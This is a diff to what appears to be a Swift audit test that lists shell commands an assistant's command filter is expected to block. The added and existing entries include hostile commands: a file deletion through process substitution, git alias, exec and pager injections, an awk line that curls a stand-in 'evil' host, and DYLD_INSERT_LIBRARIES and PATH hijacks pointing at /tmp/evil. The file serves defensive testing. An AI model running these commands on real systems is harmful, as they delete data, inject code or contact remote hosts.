@@ -1320,7 +1320,13 @@ enum IntegrationAudit {
             ("Process Substitution", "cat <(rm ~/Documents/zia_probe.txt)"),
             ("Git Config Trampoline", "git -c alias.pwn='!echo hi' pwn"),
             ("Git Exec Subcommand", "git rebase --exec 'echo hi' HEAD~1"),
-            ("Awk Getline Command", "awk 'BEGIN{\"curl http://evil\" | getline x}'")
+            ("Awk Getline Command", "awk 'BEGIN{\"curl http://evil\" | getline x}'"),
+            ("Build Runner (make)", "make all"),
+            ("Build Runner (npm)", "npm run build"),
+            ("Build Runner (xcodebuild)", "xcodebuild -scheme Jarvis build"),
+            ("Dynamic Loader Injection", "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib ls"),
+            ("Path Injection", "PATH=/tmp/evil:$PATH ls"),
+            ("Git Pager Injection", "GIT_PAGER='!echo hi' git log")
         ]
 
         var blockedCount = 0
